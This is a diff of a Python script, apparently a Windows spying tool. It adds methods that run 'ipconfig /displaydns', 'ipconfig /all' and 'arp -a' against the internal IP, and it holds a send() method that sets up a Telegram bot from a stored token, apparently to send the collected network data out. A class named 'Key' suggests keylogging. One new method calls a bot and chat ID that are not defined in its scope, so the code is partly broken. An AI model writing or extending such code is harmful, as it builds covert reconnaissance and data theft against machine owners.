@@ -331,15 +331,36 @@ class Key:
 class RedInformation:
     def __init__(self):
         pass
-    def __ip_config(self):
+    def __display_dns(self):
         response = ""
         lines = os.popen('ipconfig /displaydns')
         for line in lines:
             line.replace('\n\n', '\n')
             response += line
-
         return response
 
+    def __ip_config(self):
+        response = ""
+        bot.sendChatAction(chat_id, 'typing')
+        lines = os.popen('ipconfig /all')
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+        return response
+
+        
+
+    def __red_info(self):
+        def internalIP():
+            internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            internal_ip.connect(('google.com', 0))
+            return internal_ip.getsockname()[0]
+        response = ""
+        lines = os.popen('arp -a -N ' + internalIP())
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+        return response
 
     def send(self):
         bot = telepot.Bot(Config.TelegramBot().TOKEN)
@@ -372,16 +393,6 @@ if __name__ == '__main__':
     response = ''
     #bot.sendChatAction(chat_id, 'typing')
 
-    # Red info
-    """
-    lines = os.popen('arp -a -N ' + internalIP())
-    for line in lines:
-        line.replace('\n\n', '\n')
-        response += line
-
-    bot.sendMessage(chat_id, response)
-    #
-    """
     # Indo DNS
     """
     bot.sendChatAction(chat_id, 'typing')
@@ -394,14 +405,7 @@ if __name__ == '__main__':
     for resp in responses:
         bot.sendMessage(chat_id, resp)
     """
-    # Ip config
-    """
-    bot.sendChatAction(chat_id, 'typing')
-        lines = os.popen('ipconfig /all')
-        for line in lines:
-            line.replace('\n\n', '\n')
-            response += line
-    """
+
     """ # Usuario
     bot.sendChatAction(chat_id, 'typing')
     info = ''
